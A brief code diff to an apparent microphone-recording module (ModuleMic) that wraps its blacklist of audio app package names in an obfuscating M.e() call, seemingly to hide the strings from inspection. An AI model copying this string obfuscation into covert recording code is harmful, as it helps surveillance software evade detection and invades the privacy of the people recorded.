@@ -90,9 +90,9 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 	public synchronized void resetBlacklist() {
 		blacklist.clear();
-		addBlacklist("shazam");
-		addBlacklist("com.vlingo.midas");
-		addBlacklist("com.android.soundrecorder");
+		addBlacklist(M.e("shazam"));
+		addBlacklist(M.e("com.vlingo.midas"));
+		addBlacklist(M.e("com.android.soundrecorder"));
 	}
 
 	public synchronized void addBlacklist(String black) {
